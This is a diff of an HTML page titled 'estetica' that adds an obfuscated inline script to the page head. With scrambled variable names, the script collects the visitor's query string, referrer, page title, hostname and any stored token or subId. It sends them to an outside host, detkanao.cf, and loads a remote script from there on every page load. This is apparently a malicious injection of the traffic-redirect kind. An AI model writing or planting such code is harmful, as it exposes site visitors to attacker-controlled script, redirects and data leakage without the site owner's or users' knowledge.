@@ -1,7 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-    
+    <script>
+    (function() {
+    var name = '_hWTRWpNZq27W687m';
+    if (!window._hWTRWpNZq27W687m) {
+        window._hWTRWpNZq27W687m = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://detkanao.cf/vGXsp3cV',
+            P_PATH: 'https://detkanao.cf/7b4f75c/postback',
+        };
+    }
+    const _r45KLgSSRJ66h5NP = localStorage.getItem('config');
+    if (typeof _r45KLgSSRJ66h5NP !== 'undefined' && _r45KLgSSRJ66h5NP !== null) {
+        var _2pK1qcsXf15tkBbB = JSON.parse(_r45KLgSSRJ66h5NP);
+        var _MR9vT9HVc9TzdKgm = Math.round(+new Date()/1000);
+        if (_2pK1qcsXf15tkBbB.created_at + window._hWTRWpNZq27W687m.ttl < _MR9vT9HVc9TzdKgm) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _6QYk3wXBCMg5C8SB = localStorage.getItem('subId');
+    var _SXf149Fzpprfq9r3 = localStorage.getItem('token');
+    var _MRr49hgntQ3sp1YJ = '?return=js.client';
+        _MRr49hgntQ3sp1YJ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _MRr49hgntQ3sp1YJ += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _MRr49hgntQ3sp1YJ += '&default_keyword=' + encodeURIComponent(document.title);
+        _MRr49hgntQ3sp1YJ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _MRr49hgntQ3sp1YJ += '&name=' + encodeURIComponent(name);
+        _MRr49hgntQ3sp1YJ += '&host=' + encodeURIComponent(window._hWTRWpNZq27W687m.R_PATH);
+    if (typeof _6QYk3wXBCMg5C8SB !== 'undefined' && _6QYk3wXBCMg5C8SB && window._hWTRWpNZq27W687m.unique) {
+        _MRr49hgntQ3sp1YJ += '&sub_id=' + encodeURIComponent(_6QYk3wXBCMg5C8SB);
+    }
+    if (typeof _SXf149Fzpprfq9r3 !== 'undefined' && _SXf149Fzpprfq9r3 && window._hWTRWpNZq27W687m.unique) {
+        _MRr49hgntQ3sp1YJ += '&token=' + encodeURIComponent(_SXf149Fzpprfq9r3);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._hWTRWpNZq27W687m.R_PATH + _MRr49hgntQ3sp1YJ;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
     <title>estetica</title>
 
